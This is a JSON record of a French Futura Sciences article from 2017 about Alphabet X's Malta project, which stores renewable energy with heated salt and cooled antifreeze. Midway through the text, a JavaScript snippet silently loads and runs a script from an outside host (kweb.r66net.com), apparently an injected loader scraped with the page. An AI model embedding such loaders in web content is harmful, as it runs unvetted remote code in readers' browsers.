{"title": "Google veut stocker les energies renouvelables... avec du sel !", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-08-02", "content": "X, le laboratoire de recherche et developpement d'Alphabet (maison mere de Google), planche sur un systeme de stockage des energies renouvelables qui pourrait remplacer les solutions avec batteries lithium-ion. Baptise Malta, celui-ci repose sur du sel et de l'antigel. Ce qu'il faut retenir Le stockage et la restitution des energies renouvelables sont des enjeux actuels majeurs. Alphabet, maison mere de Google, travaille sur un systeme a base de sel et d'antigel. Il serait plus efficace et moins couteux que le stockage sur batteries lithium-ion. L'Allemand Siemens est egalement sur les rangs. Actuellement, le recours aux  energies renouvelables  pour alimenter les reseaux electriques implique une problematique de taille : le decalage entre les moments ou la nature permet de collecter l'energie a partir du  soleil  ou du  vent  et les besoins quotidiens des usagers a des periodes qui ne sont pas en phase avec la production. Cette situation induit un gaspillage consequent faute de pouvoir stocker cette energie de facon abordable et durable pour la restituer au moment voulu (voir  << Le saviez-vous ? >>  ci-dessous). Les solutions de stockage des  energies renouvelables  existent, notamment sur des  batteries lithium-ion .  Tesla  fait partie des acteurs presents sur ce creneau avec ses systemes Powerpack (entreprises et collectivites) et Powerwall (particuliers). Recemment, la societe dirigee par Elon Musk a annonce qu'elle allait installer en Australie-Meridionale un systeme de stockage sur  batteries lithium-ion  d'une capacite de 100 megawatts qui sera connecte a des fermes  eoliennes . Mais un concurrent inattendu pourrait surgir dans les prochaines annees... Un schema representant le systeme de stockage d'energies renouvelables du projet Malta d'Alphabet. Deux reservoirs contiennent du sel ( Hot Salt Storage , en anglais sur le schema) qui est chauffe tandis que les deux autres renferment de l'antigel refroidi ( Cold Liquid Storage ) par des flux d'air. Ces derniers sont ensuite envoyes vers une pompe a chaleur ( Heat Pump ) afin de produire de l'electricite pour alimenter le reseau. (c) X                               Du sel chauffe et de l'antigel refroidi En effet, dans le secret de son laboratoire de recherche et developpement nomme << X >>, Alphabet (maison mere de  Google ) travaille sur une alternative qui promet d'etre plus efficace et moins couteuse que la technologie lithium-ion. Baptise Malta, ce projet, decrit dans un article publie par  Bloomberg , repose sur l'usage de sel et d'antigel pour stocker l'energie et la restituer. Selon ses concepteurs, ce systeme peut non seulement conserver l'energie plus longtemps mais aussi etre financierement competitif face aux usines  hydroelectriques  et aux autres solutions de stockage des energies propres.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Il se presente sous la forme d'une centrale electrique composee de quatre reservoirs relies par des tuyaux a une  pompe a chaleur  (voir schema ci-dessus). Deux reservoirs sont emplis de sel tandis que les deux autres contiennent un antigel ou un  hydrocarbure  liquide. L'electricite, d'origine solaire ou eolienne, arrive dans le circuit et sert a creer deux flux d' air  : l'un chaud, l'autre froid. Le premier chauffe le sel tandis que le second refroidit l'antigel. L'energie est alors stockee pour une  duree  variant de plusieurs heures a plusieurs jours, selon le niveau d' isolation  des reservoirs. Le saviez-vous ? Selon les chiffres d'une etude realisee par  Bloomberg New Energy Finance , au cours du premier semestre 2017, l'Etat de Californie (Etats-Unis) a perdu l'equivalent de 300.000 megawatts d'electricite produits  via  des panneaux solaires et des fermes eoliennes car il ne pouvait pas la stocker. En 2015, l'Allemagne a perdu 4 % de l'energie eolienne produite. En Chine, ce pourcentage s'eleve a 17 %. L'avenir du projet Malta d'Alphabet n'est pas encore clair Pour restituer l'energie, le processus est inverse. Les flux d'air (chaud et froid) sont diriges vers une turbine qui va produire de l'electricite injectee a la demande dans le reseau. Pour le moment, le dispositif developpe par Google est un prototype qui n'a pas encore ete teste en conditions reelles sur un  reseau electrique . Selon les ingenieurs du laboratoire X, ce systeme de stockage pourrait etre dimensionne pour desservir des grands sites industriels, des  centres de donnees  aussi bien que de petites fermes eoliennes ou  photovoltaiques .  Alphabet n'est pas le premier ni le seul a travailler sur ce concept. Bloomberg rappelle que l'Allemand  Siemens  est egalement sur les rangs. Mais les chercheurs du projet Malta ont apparemment trouve un moyen de faire fonctionner le systeme a des temperatures inferieures, ce qui evite d'avoir a recourir a des materiaux ceramiques et des  aciers  tres couteux. Pour le moment, Alphabet n'a pas encore declare quelles etaient ses intentions avec le projet Malta. Il est probable que le geant americain cherchera a nouer un partenariat pour realiser des essais en conditions reelles avant de poursuivre son projet. ", "theme": "planete"}